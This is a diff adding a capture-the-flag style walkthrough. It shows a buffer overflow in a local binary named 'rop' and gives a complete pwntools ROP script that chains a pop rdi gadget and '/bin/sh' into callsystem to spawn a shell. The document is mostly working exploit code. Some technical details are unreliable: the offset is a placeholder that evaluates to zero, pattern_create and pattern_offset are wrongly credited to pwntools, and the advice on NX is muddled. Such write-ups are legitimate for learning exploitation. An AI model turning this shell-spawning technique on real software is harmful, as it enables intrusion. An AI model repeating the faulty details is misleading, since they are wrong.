@@ -1,0 +1,110 @@
+To solve this challenge using `pwntools`, we need to perform a Return-Oriented Programming (ROP) attack. The goal is to redirect the execution flow to the `callsystem` function, which will give us a shell.
+
+### Steps to Solve the Challenge
+
+1. **Identify the Buffer Overflow**: The `vulnerable_function` reads up to 512 bytes into a buffer of size 128, causing a buffer overflow.
+2. **Find Useful Gadgets**: Use the gadgets provided to control the stack and registers.
+3. **Construct the ROP Chain**: Build a ROP chain to call `callsystem`.
+4. **Exploit the Vulnerability**: Send the payload to the binary to get a shell.
+
+### Code Implementation
+
+Here's a step-by-step guide with the corresponding `pwntools` code:
+
+1. **Set Up pwntools**:
+   ```python
+   from pwn import *
+   ```
+
+2. **Load the Binary and Find Offsets**:
+   ```python
+   # Load the binary
+   elf = context.binary = ELF('rop')
+
+   # Find the offset to the return address
+   offset = cyclic_find(0x61616161)  # Replace with the actual offset found by cyclic pattern
+   ```
+
+3. **Find the Address of `callsystem`**:
+   ```python
+   callsystem_addr = elf.symbols['callsystem']
+   log.info(f'callsystem address: {hex(callsystem_addr)}')
+   ```
+
+4. **Find Useful Gadgets**:
+   ```python
+   # Find a gadget to pop the value of RDI (first argument to system)
+   pop_rdi = next(elf.search(asm('pop rdi; ret')))
+   log.info(f'pop rdi gadget: {hex(pop_rdi)}')
+   ```
+
+5. **Construct the ROP Chain**:
+   ```python
+   # Construct the ROP chain
+   rop = ROP(elf)
+   rop.raw(b'A' * offset)  # Fill the buffer
+   rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)  # Pop the address of "/bin/sh" into RDI
+   rop.raw(next(elf.search(b'/bin/sh')))  # Address of "/bin/sh" string
+   rop.raw(callsystem_addr)  # Call callsystem
+
+   log.info(f'ROP chain: {rop.chain()}')
+   ```
+
+6. **Send the Payload**:
+   ```python
+   # Start the process
+   p = process(elf.path)
+
+   # Send the payload
+   p.sendline(rop.chain())
+
+   # Interact with the shell
+   p.interactive()
+   ```
+
+### Complete Script
+
+```python
+from pwn import *
+
+# Load the binary
+elf = context.binary = ELF('rop')
+
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Replace with the actual offset found by cyclic pattern
+log.info(f'Offset: {offset}')
+
+# Find the address of callsystem
+callsystem_addr = elf.symbols['callsystem']
+log.info(f'callsystem address: {hex(callsystem_addr)}')
+
+# Find a gadget to pop the value of RDI (first argument to system)
+pop_rdi = next(elf.search(asm('pop rdi; ret')))
+log.info(f'pop rdi gadget: {hex(pop_rdi)}')
+
+# Construct the ROP chain
+rop = ROP(elf)
+rop.raw(b'A' * offset)  # Fill the buffer
+rop.raw(pop_rdi)  # Pop the address of "/bin/sh" into RDI
+rop.raw(next(elf.search(b'/bin/sh')))  # Address of "/bin/sh" string
+rop.raw(callsystem_addr)  # Call callsystem
+
+log.info(f'ROP chain: {rop.chain()}')
+
+# Start the process
+p = process(elf.path)
+
+# Send the payload
+p.sendline(rop.chain())
+
+# Interact with the shell
+p.interactive()
+```
+
+### Notes
+
+- **Finding the Offset**: You can use `pattern_create` and `pattern_offset` from `pwntools` to find the exact offset.
+- **Address of "/bin/sh"**: If the binary does not contain the string "/bin/sh", you might need to leak addresses or use a different approach to find it.
+- **ASLR and NX**: Ensure that ASLR and NX are disabled or bypassed if they are enabled.
+
+This script should help you exploit the vulnerability and get a shell. Adjust the offset and other values as needed based on your specific environment and binary.
